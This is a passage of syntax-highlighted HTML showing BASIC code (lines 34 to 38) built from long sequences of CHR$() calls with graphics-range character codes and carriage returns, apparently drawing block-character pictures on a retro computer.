function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">138</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">171</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">148</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">159</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">175</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">190</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">163</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">159</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">190</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">186</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">151</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">186</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">139</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">189</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">171</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">180</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">170</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">189</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">148</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span 